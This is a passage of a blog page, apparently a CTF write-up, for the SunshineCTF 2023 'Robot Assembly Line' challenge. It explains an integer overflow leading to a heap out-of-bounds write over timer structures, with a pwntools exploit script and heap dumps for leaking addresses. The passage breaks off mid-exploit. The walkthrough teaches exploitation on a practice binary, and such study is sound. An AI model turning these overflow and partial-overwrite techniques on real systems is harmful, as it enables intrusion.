@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>SunshineCTF 2023 - Robot Assembly Line | kileak</title>
+
+
+
+
+
+<meta name="description" content="SunshineCTF 2023 - Robot Assembly Line">
+
+
+<meta name="keywords" content="sunshine, robot assembly line">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2023/sunshine23-ral/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">SunshineCTF 2023 - Robot Assembly Line</h1>
+      <p class="post-meta">Oct 8, 2023</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>SunshineCTF 2023 - Robot Assembly Line
+<!--break--></p>
+
+  <p>We found the robotic turret assembly line control station! Can you break in to corrupt all of the robot turrets that are being manufactured?</p>
+
+  <p>nc chal.2023.sunshinectf.games 23000</p>
+
+  <p>Author: kcolley</p>
+
+  <p>Team: Weak But Leet</p>
+
+  <p>Attachment: 
+<a href="https://kileak.github.io/assets/sunshine23/ral/robots-assemble">robots-assemble</a> 
+<a href="https://kileak.github.io/assets/sunshine23/ral/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Enter number of robot turrets to manufacture:
+10
+Initializing turret #1. Name?
+AAAA
+IQ for robot AAAA?
+100
+Should robot AAAA be self-aware?
+y
+Should robot AAAA be evil?
+y
+Self-destruct time for robot AAAA (in microseconds)?
+1000
+AAAA: "There you are."
+Initializing turret #2. Name?
+AAAA: "Aaaah"</code></pre></figure>
+
+<p>The challenge is about creating <code class="language-plaintext highlighter-rouge">robot</code> objects, which will then just call a <code class="language-plaintext highlighter-rouge">robot_self_destruct</code> function after the specified time.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">long</span> <span class="nf">robot_assembly_line</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">locked_printf</span><span class="p">(</span><span class="s">"Enter number of robot turrets to manufacture:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g_line</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">__isoc99_sscanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g_line</span><span class="p">,</span> <span class="s">"%zu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">count</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+  <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="n">round_up</span><span class="p">(</span><span class="mh">0x30</span> <span class="o">*</span> <span class="n">count</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span>
+
+  <span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+
+  <span class="n">g_slot</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
+
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="kt">long</span> <span class="n">result</span> <span class="o">=</span> <span class="n">Robot_assemble</span><span class="p">((</span><span class="n">Robot</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="p">)</span>
+      <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>When specifying the number of turrets, it will calculate the needed size for the buffer for storing the <code class="language-plaintext highlighter-rouge">robot</code> objects with <code class="language-plaintext highlighter-rouge">round_up</code> and allocate a buffer for it. Then it will loop through the robots, read the data for it and start a timer thread.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">long</span> <span class="nf">Robot_assemble</span><span class="p">(</span><span class="n">Robot</span> <span class="o">*</span><span class="n">bot</span><span class="p">,</span> <span class="kt">long</span> <span class="n">bot_idx</span><span class="p">)</span>
+<span class="p">{</span>  
+  <span class="n">locked_printf</span><span class="p">(</span><span class="s">"Initializing turret #%zu. Name?</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">bot_idx</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">read_line</span><span class="p">(</span><span class="n">bot</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+  <span class="n">locked_printf</span><span class="p">(</span><span class="s">"IQ for robot %s?</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">bot</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g_line</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="n">__isoc99_sscanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g_line</span><span class="p">,</span> <span class="s">"%u"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bot</span><span class="o">-&gt;</span><span class="n">IQ</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+  <span class="n">locked_printf</span><span class="p">(</span><span class="s">"Should robot %s be self-aware?</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">bot</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g_line</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>  
+  <span class="n">bot</span><span class="o">-&gt;</span><span class="n">self_aware</span> <span class="o">=</span> <span class="n">tolower</span><span class="p">(</span><span class="n">g_line</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'y'</span><span class="p">;</span>
+
+  <span class="n">locked_printf</span><span class="p">(</span><span class="s">"Should robot %s be evil?</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">bot</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g_line</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>  
+  <span class="n">bot</span><span class="o">-&gt;</span><span class="n">is_evil</span> <span class="o">=</span> <span class="n">tolower</span><span class="p">(</span><span class="n">g_line</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'y'</span><span class="p">;</span>
+
+  <span class="n">locked_printf</span><span class="p">(</span><span class="s">"Self-destruct time for robot %s (in microseconds)?</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">bot</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g_line</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="n">__isoc99_sscanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g_line</span><span class="p">,</span> <span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">self_destruct_time</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+  <span class="kt">char</span><span class="o">*</span> <span class="n">hello_msg</span> <span class="o">=</span> <span class="n">random_hello_message</span><span class="p">();</span>
+  <span class="n">locked_printf</span><span class="p">(</span><span class="s">"%s: </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"\n</span><span class="s">"</span><span class="p">,</span> <span class="n">bot</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">hello_msg</span><span class="p">);</span>
+
+  <span class="n">Timer_start</span><span class="p">(</span><span class="n">self_destruct_time</span><span class="p">,</span> <span class="n">robot_self_destruct</span><span class="p">,</span> <span class="n">bot</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">robot_self_destruct</code> itself will print the name of the <code class="language-plaintext highlighter-rouge">robot</code> and a random death message.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">robot_self_destruct</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">bot_name</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">death_message</span> <span class="o">=</span> <span class="n">random_death_message</span><span class="p">();</span>
+  <span class="k">return</span> <span class="n">locked_printf</span><span class="p">(</span><span class="s">"%s: </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"\n</span><span class="s">"</span><span class="p">,</span> <span class="n">bot_name</span><span class="p">,</span> <span class="n">death_message</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>So far, so good… If we’re nice and only entering valid sizes for the <code class="language-plaintext highlighter-rouge">robot</code> array…</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">size</span> <span class="o">=</span> <span class="n">round_up</span><span class="p">(</span><span class="mh">0x30</span> <span class="o">*</span> <span class="n">count</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span>
+
+<span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+  
+<span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">robot_assembly_line</code> calculates the size for the <code class="language-plaintext highlighter-rouge">buffer</code> object with <code class="language-plaintext highlighter-rouge">round_up</code>, but uses the entered <code class="language-plaintext highlighter-rouge">count</code> for the loop.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">round_up</span><span class="p">(</span><span class="kt">long</span> <span class="n">val</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">+</span> <span class="n">size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">/</span> <span class="n">size</span> <span class="o">*</span> <span class="n">size</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">result</span> <span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This screams for <code class="language-plaintext highlighter-rouge">integer overflow</code>. If we provide a <code class="language-plaintext highlighter-rouge">count</code> big enough, that <code class="language-plaintext highlighter-rouge">val + size - 1</code> will overflow and then be smaller than <code class="language-plaintext highlighter-rouge">size * size</code>, result would be <code class="language-plaintext highlighter-rouge">0</code> and <code class="language-plaintext highlighter-rouge">round_up</code> will return the minimum size <code class="language-plaintext highlighter-rouge">0x30</code>, but the following loop uses our huge <code class="language-plaintext highlighter-rouge">count</code> for reading the <code class="language-plaintext highlighter-rouge">robot</code> objects.</p>
+
+<p>This will lead to an out of bounds write via the robot objects, with which we can overwrite the <code class="language-plaintext highlighter-rouge">timer</code> structs for previous <code class="language-plaintext highlighter-rouge">robots</code>.</p>
+
+<p>Let’s set this up</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"chal.2023.sunshinectf.games"</span>
+<span class="n">PORT</span> <span class="o">=</span>  <span class="mi">23000</span>
+<span class="n">PROCESS</span> <span class="o">=</span> <span class="s">"./robots-assemble"</span>
+
+<span class="k">def</span> <span class="nf">setrobot</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">iq</span><span class="p">,</span> <span class="n">selfaware</span><span class="p">,</span> <span class="n">evil</span><span class="p">,</span> <span class="n">timer</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">iq</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"y"</span> <span class="k">if</span> <span class="n">selfaware</span> <span class="k">else</span> <span class="s">"n"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"y"</span> <span class="k">if</span> <span class="n">evil</span> <span class="k">else</span> <span class="s">"n"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">timer</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">pause</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="o">/</span><span class="mh">0x30</span><span class="p">))</span>
+
+    <span class="n">setrobot</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">10</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="bp">True</span><span class="p">,</span> <span class="bp">True</span><span class="p">,</span> <span class="mi">40</span><span class="o">*</span><span class="mi">1000</span><span class="o">*</span><span class="mi">1000</span><span class="p">)</span>
+    <span class="n">setrobot</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">10</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="bp">True</span><span class="p">,</span> <span class="bp">True</span><span class="p">,</span> <span class="mi">40</span><span class="o">*</span><span class="mi">1000</span><span class="o">*</span><span class="mi">1000</span><span class="p">)</span>
+    <span class="n">setrobot</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="mi">2</span><span class="o">*</span><span class="mi">1000</span><span class="o">*</span><span class="mi">1000</span><span class="p">)</span>
+    <span class="n">setrobot</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="mi">4</span><span class="o">*</span><span class="mi">1000</span><span class="o">*</span><span class="mi">1000</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Name?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+    <span class="k">return</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./robots-assemble"</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./robots-assemble"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span><span class="s">"./libc.so.6"</span><span class="p">})</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
+        <span class="n">pause</span><span class="p">()</span>
+
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<p>This will setup the <code class="language-plaintext highlighter-rouge">buffer</code> object with <code class="language-plaintext highlighter-rouge">malloc(0x30)</code>, which creates a <code class="language-plaintext highlighter-rouge">0x40</code> chunk, which has enough room for 2 robots, but it will then create 4 robots. Thus, robots <code class="language-plaintext highlighter-rouge">2</code> and <code class="language-plaintext highlighter-rouge">3</code> will overwrite the <code class="language-plaintext highlighter-rouge">timer</code> struct for robots <code class="language-plaintext highlighter-rouge">0</code> and <code class="language-plaintext highlighter-rouge">1</code>. If robots <code class="language-plaintext highlighter-rouge">0</code> or <code class="language-plaintext highlighter-rouge">1</code> would try to execute it’s death function now, it would segfault, since they’re overwritten with junk. Because of that, we gave them a huge execution time to avoid them to be executed at all.</p>
+
+<p>The reasoning behind creating 4 <code class="language-plaintext highlighter-rouge">robots</code> in the start is to move down the heap, so that the pointer in the <code class="language-plaintext highlighter-rouge">timer</code> struct points to a heap area, where we can make it point to some useful data with just a one byte overwrite (we could have also tried to do a nibble bruteforce, but let’s keep it clean, so that no bruteforce is needed).</p>
+
+<p>Let’s check the heap, while the objects are created, to get a better understanding what’s happening.</p>
+
+<p>After creating the first two robots, the heap will look like this</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555555a3b0:	0x0000000000000000	0x0000000000000041
+0x55555555a3c0:	0x4141414141414141	0x0000006401014141 &lt;= robot buffer (bot 0)
+0x55555555a3d0:	0x0000000000000000	0x0000000000000000
+0x55555555a3e0:	0x0000000000000000	0x0000000000000000
+0x55555555a3f0:	0x4141414141414141	0x0000006401014141 &lt;= bot 1
+0x55555555a400:	0x0000000000000000	0x0000000000000000
+0x55555555a410:	0x0000000000000000	0x0000000000000031
+0x55555555a420:	0x000055555555a3c0	0x00005555555559c0 &lt;= timer for bot 0
+0x55555555a430:	0x000055555555a460	0x00000000652281ca
+0x55555555a440:	0x000000001399a4ac	0x0000000000000031
+0x55555555a450:	0x000055555555a3f0	0x00005555555559c0 &lt;= timer for bot 1
+0x55555555a460:	0x0000000000000000	0x00000000652281ca
+0x55555555a470:	0x0000000013a0b420	0x0000000000020b91</code></pre></figure>
+
+<p>The <code class="language-plaintext highlighter-rouge">timer</code> object for every bot will contain a pointer to the bot itself, a pointer to the <code class="language-plaintext highlighter-rouge">self_destruct</code> function and the time, after which it should be executed.</p>
+
+<p>Since the buffer was allocated too small, the current input function for bot <code class="language-plaintext highlighter-rouge">2</code> will read data to <code class="language-plaintext highlighter-rouge">0x55555555a420</code>, which is also the timer object for bot <code class="language-plaintext highlighter-rouge">0</code>. But since we have no leak by now, and there’s nothing interesting in the heap from <code class="language-plaintext highlighter-rouge">0x000055555555a300</code> to <code class="language-plaintext highlighter-rouge">0x000055555555a3ff</code>, we just create more robots, so that the robot pointer for a <code class="language-plaintext highlighter-rouge">timer</code> object will point to <code class="language-plaintext highlighter-rouge">0x000055555555a4XX</code>.</p>
+
+<p>Then we can do a one byte overwrite and let it point somewhere else, which contains more useful data.</p>
+
+<p>After creating bots <code class="language-plaintext highlighter-rouge">2</code> and <code class="language-plaintext highlighter-rouge">3</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555555a3b0:	0x0000000000000000	0x0000000000000041
+0x55555555a3c0:	0x4141414141414141	0x0000006401014141 &lt;= buffer (bot 0)
+0x55555555a3d0:	0x0000000000000000	0x0000000000000000
+0x55555555a3e0:	0x0000000000000000	0x0000000000000000
+0x55555555a3f0:	0x4141414141414141	0x0000006401014141 &lt;= bot 1
+0x55555555a400:	0x0000000000000000	0x0000000000000000
+0x55555555a410:	0x0000000000000000	0x0000000000000031
+0x55555555a420:	0x000055555555a300	0x00000000000059c0 &lt;= bot 2 (timer bot 0)
+0x55555555a430:	0x000055555555a460	0x00000000652282ed
+0x55555555a440:	0x0000000022c5b8d8	0x0000000000000031
+0x55555555a450:	0x000055555555a300	0x00000000000059c0 &lt;= bot 3 (timer bot 1)
+0x55555555a460:	0x0000000000000000	0x00000000652282ed
+0x55555555a470:	0x0000000022ccb9a8	0x0000000000000031
+0x55555555a480:	0x000055555555a420	0x00005555555559c0 &lt;= timer bot 2 (bot 4)
+0x55555555a490:	0x000055555555a4c0	0x00000000652282cc
+0x55555555a4a0:	0x000000000571a3f5	0x0000000000000031
+0x55555555a4b0:	0x000055555555a450	0x00005555555559c0 &lt;= timer bot 3 (bot 5)
+0x55555555a4c0:	0x000055555555a430	0x00000000652282ce
+0x55555555a4d0:	0x00000000057699bd	0x0000000000020b31</code></pre></figure>
+
+<p>Now, the <code class="language-plaintext highlighter-rouge">robot</code> pointer of the timer object for bot <code class="language-plaintext highlighter-rouge">2</code> points to <code class="language-plaintext highlighter-rouge">0x000055555555a420</code> and there are a lot more useful addresses in the range, that we can now reach with overwriting only the LSB byte. Let’s point it to <code class="language-plaintext highlighter-rouge">0x55555555a490</code>.</p>
+
+<p>Remember, bot <code class="language-plaintext highlighter-rouge">2</code> is already running and we’re currently entering the name for bot <code class="language-plaintext highlighter-rouge">4</code>. So we can just send one byte (but no newline), which will overwrite the name pointer, and then we just <em>wait</em> for bot <code class="language-plaintext highlighter-rouge">2</code> trying to self-destruct.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># partial overwrite bot name to leak heap address
+</span><span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x90</span><span class="p">))</span>
+
+<span class="n">HEAPLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP leak      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAPLEAK</span><span class="p">))</span></code></pre></figure>
+
+<p>When bot <code class="language-plaintext highlighter-rouge">2</code> now self-destructs, it will print its name, which points to <code class="language-plaintext highlighter-rouge">0x55555555a490</code> and thus prints a heap-address, which we can read.</p>
+
+<p>Since we now have a complete heap address, we can overwrite more than only the least significant byte of an address.</p>
+
+<p>We’ll finish entering the data for bot <code class="language-plaintext highlighter-rouge">4</code> (the input method is still waiting for us to finish the input), so that we can start entering data for bot <code class="language-plaintext highlighter-rouge">5</code>, which is also the <code class="language-plaintext highlighter-rouge">timer</code> for bot <code class="language-plaintext highlighter-rouge">3</code> (which hasn’t terminated yet).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">finish_bot_input</span><span class="p">():</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"y"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"y"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">9999999</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Name?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="p">...</span>
+    <span class="p">...</span>
+    <span class="n">finish_bot_input</span><span class="p">()</span>
+
+    <span class="c1"># partial overwrite bot name to leak elf address
+</span>    <span class="n">PIETARGET</span> <span class="o">=</span> <span class="n">HEAPLEAK</span> <span class="o">+</span> <span class="mh">0x28</span> 
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p16</span><span class="p">(</span><span class="n">PIETARGET</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">))</span>
+
